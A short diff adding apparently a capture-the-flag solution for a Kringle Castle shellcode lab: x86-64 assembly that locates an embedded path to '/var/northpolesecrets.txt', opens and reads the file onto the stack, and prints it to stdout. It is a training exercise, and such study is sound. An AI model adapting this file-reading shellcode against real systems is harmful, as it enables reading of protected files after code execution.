@@ -1,0 +1,31 @@
+https://tracer.kringlecastle.com/?cheat#7a16e8eb-9ab0-4b45-9921-2d077f138c4d
+
+; TODO: Get a reference to this
+call Mess
+db '/var/northpolesecrets.txt',0
+Mess:
+pop rbp
+; TODO: Call sys_open
+mov rax,2
+mov rdi,rbp
+mov rsi,0
+mov rdx,0
+syscall
+; TODO: Call sys_read on the file handle and read it into rsp
+mov rbp,rax
+mov rax,0
+mov rdi,rbp
+mov rsi,rsp
+mov rdx, 10000
+syscall
+
+; TODO: Call sys_write to write the contents from rsp to stdout (1)
+mov rax,1
+mov rdi,1
+mov rsi, rsp
+mov rdx,10000
+syscall
+; TODO: Call sys_exit
+mov rax,60
+mov rdi,0
+syscall
